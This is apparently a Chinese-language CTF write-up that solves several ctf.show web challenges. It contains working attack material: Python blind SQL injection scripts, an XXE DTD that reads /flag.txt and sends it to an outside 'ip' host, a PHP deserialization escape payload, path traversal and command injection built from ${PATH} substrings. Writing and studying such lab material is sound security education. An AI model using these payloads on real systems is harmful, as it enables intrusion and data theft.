<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		die(&quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($_FILES[&quot;file&quot;][&quot;size&quot;]&gt;10*1024)&#123;</span><br><span class="line">		die(&quot;文件过大: &quot; .($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">	  $filename = md5(md5(rand(1,10000))).&quot;.zip&quot;;</span><br><span class="line">	  $filetype = (new finfo)-&gt;file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">	  $filepath = &quot;upload/&quot;.$filename;</span><br><span class="line">	  $sql = &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;.$filename.&quot;&#x27;,&#x27;&quot;.$filepath.&quot;&#x27;,&#x27;&quot;.$filetype.&quot;&#x27;);&quot;;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload/&quot; . $filename);</span><br><span class="line">	  $con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctf&quot;);</span><br><span class="line">		if (!$con)</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">		&#125;</span><br><span class="line">		if (mysqli_multi_query($con, $sql)) &#123;</span><br><span class="line">			header(&quot;location:filelist.php&quot;);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($con);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>本地复现一下</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402082343785.png" alt="image-20240208234314671"></p>
<h2 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h2><p>日志包含</p>
<h2 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#flag in http://192.168.7.68/flag</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $protocol = substr($url, 0,7);</span><br><span class="line">    if($protocol!=&#x27;http://&#x27;)&#123;</span><br><span class="line">        die(&#x27;仅限http协议访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;, $url))&#123;</span><br><span class="line">        die(&#x27;仅限域名地址访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&#x27;curl &#x27;.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制死了http协议，不给用各种特殊字符</p>
<p>本来想着自己的域名转发到192.168.7.68，但是还是会有<code>.</code>，ip转10进制或者16进制都会出现0</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402091451474.png" alt="image-20240209145109405"></p>
<p>curl可以用<code>。</code>代替<code>.</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402091452646.png" alt="image-20240209145234588"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://192。168。7。68/flag</span><br></pre></td></tr></table></figure>

<h2 id="web2-观星"><a href="#web2-观星" class="headerlink" title="web2_观星"></a>web2_观星</h2><p>fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;!&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;=&#x27;, &#x27;`&#x27;, &#x27;|&#x27;, &#x27;~&#x27;, &#x27; &#x27;, &#x27;union&#x27;, &#x27;rand&#x27;, &#x27;ascii&#x27;, &#x27;and&#x27;, &#x27;||&#x27;, &#x27;sleep&#x27;, &#x27;benchmark&#x27;, &#x27;rlike&#x27;, &#x27;like&#x27;]</span><br></pre></td></tr></table></figure>

<p>才看出来是int类型盲注，单双引号被ban了，表名可以用16进制代替</p>
<p>逗号被ban用<code>from+for</code>，但是<code>if</code>就彻底没法用了，所以用<code>case when [express] then [x] else [y] end</code>代替</p>
<p><code>ascii</code>直接换用<code>ord</code></p>
<p>直接脚本跑，估计sqlmap只会更快</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://c11b6d04-1817-4495-a58d-96b02ab819f5.challenge.ctf.show/index.php?id=&quot;</span><br><span class="line">alphabets = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;j&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;,</span><br><span class="line">             &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;G&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,</span><br><span class="line">             &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_database_name():</span><br><span class="line">    database = &quot;&quot;</span><br><span class="line">    for i in range(1, 5):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr(database()/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        database = database + chr(mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_table_name():</span><br><span class="line">    table = &quot;&quot;</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database()))/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        table = table + chr(mid)</span><br><span class="line">        print(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_column_name():</span><br><span class="line">    column = &quot;&quot;</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/(0x666c6167))/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        column = column + chr(mid)</span><br><span class="line">        print(column)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        min = 33</span><br><span class="line">        max = 127</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(flag)/**/from/**/flag)/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        flag = flag + chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get_database_name()</span><br><span class="line"># get_table_name()</span><br><span class="line"># get_column_name()</span><br><span class="line">get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web3-观图"><a href="#web3-观图" class="headerlink" title="web3_观图"></a>web3_观图</h2><p>跳转<code>showImage.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);</span><br><span class="line">//flag in config.php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;image&#x27;]))&#123;</span><br><span class="line">    $image=$_GET[&#x27;image&#x27;];</span><br><span class="line">    $str = openssl_decrypt($image, &#x27;bf-ecb&#x27;, $key);</span><br><span class="line">    if(file_exists($str))&#123;</span><br><span class="line">        header(&#x27;content-type:image/gif&#x27;);</span><br><span class="line">        echo file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用随机生成的<code>key</code>解密<code>image</code>，一段能被正确解析的密文为<code>Z6Ilu83MIDw=</code>，只要猜出原文是什么，就可以通过碰撞出<code>key</code>，然后使用<code>encrypt</code>进行读取了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$r = 0;</span><br><span class="line">while (True)&#123;</span><br><span class="line">    while (ob_get_level()) &#123;</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    $t = rand();</span><br><span class="line">    if ($r&lt;$t)&#123;</span><br><span class="line">        $r = $t;</span><br><span class="line">        echo $t.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//经过碰撞大概可以知道rand的范围为0-2147483647(梅森素数)</span><br></pre></td></tr></table></figure>

<p>写个加密碰撞脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$pass = &quot;Z6Ilu83MIDw=&quot;;</span><br><span class="line">for ($i=0;$i&lt;=2147483647;$i++)&#123;</span><br><span class="line">    while (ob_get_level()) &#123;</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    $key = substr(md5(&#x27;ctfshow&#x27;.$i),3,8);</span><br><span class="line">    if (preg_match(&#x27;/jpg|gif|png/&#x27;,(openssl_decrypt($pass, &#x27;bf-ecb&#x27;, $key))))&#123;</span><br><span class="line">        echo $i.$key.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//碰出来27347</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$file = &quot;config.php&quot;;</span><br><span class="line">$key = substr(md5(&#x27;ctfshow&#x27;.&quot;27347&quot;),3,8);</span><br><span class="line">echo openssl_encrypt($file, &#x27;bf-ecb&#x27;, $key);</span><br></pre></td></tr></table></figure>

<h2 id="web4-观心"><a href="#web4-观心" class="headerlink" title="web4_观心"></a>web4_观心</h2><p>点击<code>占卜</code>访问<code>api.php</code>，看一眼负载一眼xxe</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402151804476.png" alt="image-20240215180430368">*</p>
<p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
<p><a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
<p>test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>evil.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">&lt;test&gt;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>直接调用xml就行</p>
<p>这题不知道什么原因，在远程调用<code>&lt;!ENTITY &amp;#37; xxe SYSTEM &#39;http://ip/%file;&#39;&gt;</code>没有实际访问出来，导致在远程没法读出来，但是可以利用<code>file:///flag.txt</code>读到的换行符造成<code>loadXML()</code>报错回显</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402151956352.png" alt="image-20240215195634279"></p>
<p><a href="https://security.stackexchange.com/questions/234655/php-blind-xxe-exploitation-invalid-uri-in-entity">参考</a></p>
<p>如果使用base64后的结果，不会报错，但同时并没有请求出来</p>
<h2 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">	public $uname;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($uname,$password)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;uname=$uname;</span><br><span class="line">		$this-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">			if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				include(&#x27;flag.php&#x27;);</span><br><span class="line">				echo $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				echo &#x27;wrong password&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br></pre></td></tr></table></figure>

<p>一眼丁真，变长度反序列化绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h2><p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$url[1]=$_POST[&#x27;url&#x27;];</span><br><span class="line">if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</span><br><span class="line">    $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</span><br><span class="line">    if($d)&#123;</span><br><span class="line">             highlight_file(&#x27;hint.php&#x27;);</span><br><span class="line">             if(filter_var($url[1],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[1]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                if(preg_match(&#x27;/ctfshow\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[1]));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &#x27;差点点就成功了！&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;please give me url!!!&#x27;;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;想一想md5碰撞原理吧?!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;第一个都过不了还想要flag呀?!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求<code>$a</code>是数字，长度小于7，非零且平方运算等于零</p>
<p>可以猜测大概是使用科学计数法来打</p>
<p><a href="https://stackoverflow.com/questions/19779806/minimum-evaluatable-scientific-value">Minimum evaluatable scientific value?</a></p>
<p>由于php中双精度存储的限制，<code>1E-323</code>会以<code>float(9.8813129168249E-323)</code>的形式存储，当下探一位到<code>1E-324</code>时，精度不满足就到了<code>float(0)</code></p>
<p>所以只要令<code>$a=1E-162</code>即可</p>
<p>md2注意到hint内容，联想到md5的弱类型比较，肯定是要<code>0exxxxx == 0exxxx</code>的类型</p>
<p>这个hint给的也💩，实际上应该是这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b = xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">$c = xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$c))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Hash import MD2</span><br><span class="line"></span><br><span class="line">b = &quot;024452&quot;</span><br><span class="line">c = &quot;48399&quot;</span><br><span class="line">num = &quot;0123456789&quot;</span><br><span class="line">for i in num:</span><br><span class="line">    for j in num:</span><br><span class="line">        for k in num:</span><br><span class="line">            for q in num:</span><br><span class="line">                payload2 = &quot;0e&quot; + i + j + k + q + c</span><br><span class="line">                md2_hash_2 = MD2.new(payload2.encode()).hexdigest()</span><br><span class="line">                md2_hash_3 = MD2.new(md2_hash_2.encode()).hexdigest()</span><br><span class="line">                if md2_hash_3[:2] == &#x27;0e&#x27; and md2_hash_3[2:].isdigit():</span><br><span class="line">                    print(&quot;2:&quot; + payload2)</span><br><span class="line">            payload1 = &quot;0e&quot; + i + j + k + b</span><br><span class="line">            md2_hash_1 = MD2.new(payload1.encode()).hexdigest()</span><br><span class="line">            if md2_hash_1[:2] == &#x27;0e&#x27; and md2_hash_1[2:].isdigit():</span><br><span class="line">                print(&quot;1:&quot; + payload1)</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">2:0e603448399</span><br><span class="line">1:0e652024452</span><br></pre></td></tr></table></figure>

<p>第三步提示<code>flag in /fl0g.txt</code>，要求传入能过URL筛选器的字符</p>
<p><code>file_get_contents</code>有个点就是，当传入的伪协议头未知时，当做文件夹操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=httpt://ctfshow.com/../../../../../../../../fl0g.txt</span><br><span class="line">http变为httpt这个未知协议</span><br></pre></td></tr></table></figure>

<h2 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;%&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;\\&#x27;, &#x27;^&#x27;, &#x27;select&#x27;, &#x27;union&#x27;, &#x27;sleep&#x27;]</span><br></pre></td></tr></table></figure>

<p>单双引号和反斜杠都被过滤了，肯定绕不过了</p>
<p>由于这里用的特殊匹配方法<code>like</code></p>
<blockquote>
<p>like有两个模式：_和%</p>
<p>_：表示单个字符，用来查询定长的数据</p>
<p>%：表示0个或多个任意字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;（1）SELECT * FROM Persons  WHERE City LIKE &#x27;N%&#x27;     &quot;Persons&quot; 表中选取居住在以 &quot;N&quot; 开始的城市里的人</span><br><span class="line">&gt;（2）SELECT * FROM Persons  WHERE City LIKE &#x27;%g&#x27;     &quot;Persons&quot; 表中选取居住在以 &quot;g&quot; 结尾的城市里的人</span><br><span class="line">&gt;（3）SELECT * FROM Persons   WHERE City LIKE &#x27;%lon%&#x27;  从 &quot;Persons&quot; 表中选取居住在包含 &quot;lon&quot; 的城市里的人</span><br><span class="line">&gt;（4）SELECT * FROM Persons   WHERE City NOT LIKE &#x27;%lon%&#x27;  从 &quot;Persons&quot; 表中选取居住在不包含 &quot;lon&quot; 的城市里的人</span><br></pre></td></tr></table></figure>
</blockquote>
<p>往<code>password</code>里塞32个<code>_</code>，能模糊匹配，打出回显：<code>I have filtered all the characters. Why can you come in? get out!</code></p>
<p>跑个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://10e8ff00-4077-42a3-9cbc-b9b6fe7ff911.challenge.ctf.show/login.php&quot;</span><br><span class="line">length = 32</span><br><span class="line">tables = string.printable</span><br><span class="line">password = &quot;&quot;</span><br><span class="line">for i in range(length):</span><br><span class="line">    for table in tables:</span><br><span class="line">        payload = password + table + &quot;_&quot; * (length - i - 1)</span><br><span class="line">        r = requests.post(url, data=&#123;</span><br><span class="line">            &quot;username&quot;: &quot;yu22x&quot;,</span><br><span class="line">            &quot;password&quot;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        if &quot;wrong username or password&quot; not in r.text:</span><br><span class="line">            password = password + table</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>进去是个ip测试，自己起个发现是使用<code>curl</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162309199.png" alt="image-20240216230905126"></p>
<p>fuzz一下过滤了全部小写字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;/&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;`&#x27;, &#x27;|&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;]</span><br></pre></td></tr></table></figure>

<p>剩下可用的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;_&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27; &#x27;, &#x27;\r&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;]</span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境变量 +linux字符串截取 + 通配符</span><br></pre></td></tr></table></figure>

<p><a href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctf里读取文件相关知识点总结</a></p>
<p>里面提到过空格&#x2F;被过滤可以使用<code>$&#123;PATH:0:1&#125;</code>来代替，同理，我们要执行的也可以用这个来代替</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162327228.png" alt="image-20240216232730176"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162329210.png" alt="image-20240216232913174"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;-&gt;ls</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.???-&gt;nl ????.???</span><br></pre></td></tr></table></figure>

